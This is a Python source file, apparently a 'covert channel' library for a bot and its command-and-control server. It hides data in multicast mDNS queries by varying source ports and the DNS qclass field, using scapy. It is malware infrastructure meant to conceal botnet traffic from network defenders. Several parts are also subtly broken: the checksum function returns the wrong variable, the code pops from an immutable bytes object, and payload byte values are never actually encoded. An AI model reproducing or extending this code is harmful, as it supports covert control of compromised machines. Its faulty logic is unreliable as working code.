#!/usr/bin/python3
# Covert Channel Communication Library for bot and c2 to use
import bitarray
from scapy import packet
from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send
import time


def mkpkt(srcprt: int, qclass: int) -> packet.Packet:
    # TODO: make sure setting broadcast IP is enough or if we need to set broadcast MAC too
    myip = get_if_addr(conf.iface)
    # Construct query from raw bytes
    query = DNS(b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\t_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c'
                b'\x00\x01')
    # set qclass to checksum fragment value
    query.qd.qclass = qclass
    # construct new packet and send it to broadcast addr
    return IP(src=myip, dst="224.0.0.251") / UDP(sport=srcprt, dport="mdns") / query


def calcsum(inp: str):
    """Incredibly stupid checksum function but it should work"""
    bits = bitarray.bitarray()
    output = bitarray.bitarray()
    # Convert string into bits
    bits.frombytes(bytes(inp, "utf8"))
    counter = 0
    for i in bits:
        if counter == 0:
            output.append(i)
        elif counter == 15:
            counter = 0
        else:
            counter += 1
    while len(bits) > 16:
        bits.pop()
    while len(bits) < 16:
        bits.append(1)
    return bits


class Message:
    def __init__(self, string: str):
        self.bytes = bytes(string, "utf8")
        self.checksum = calcsum(string)
        self.base_port = 5350

    def preamble(self):
        # Transmit 0xAA 0xFF 0xAA 0xFF
        while round(time.time(), 2) - round(time.time()) != 0.0:
            # wait until next second to start transmission
            time.sleep(0.005)
        for i in range(0, 4):
            mask = i % 2
            for b in range(0, 8):
                if b % 2 != mask:
                    continue
                qclass = 0
                # Grab checksum segment and convert to qclass symbol
                match self.checksum[2 * b:2 * b + 2].tolist():
                    case [0, 0]:
                        qclass = 1
                    case [1, 0]:
                        qclass = 2
                    case [0, 1]:
                        qclass = 3
                    case [1, 1]:
                        qclass = 4
                # build packet and send it
                p = mkpkt(self.base_port + b, qclass)
                send(p)

    def postabmle(self):
        # Transmit 0xFF 0xAA 0xFF 0xAA
        for i in range(0, 4):
            mask = i % 2
            time.sleep(0.25)
            for b in range(0, 8):
                if b % 2 == mask:
                    continue
                p = mkpkt(self.base_port + b, 255)
                send(p)

    def send(self):
        self.preamble()
        while len(self.bytes) != 0:
            # Wait 1/4 second for next frame (synchronized by preamble)
            time.sleep(0.25)
            for i in range(0, 8):
                try:
                    payload = self.bytes.pop(0)
                except IndexError:  # shouldn't ever happen since we converted from bytes
                    break
                # Don't transmit packet if payload is 0
                if payload == 0:
                    continue
                p = mkpkt(self.base_port+i, 1)
                send(p)
        self.postabmle()
        print("Done transmitting!")

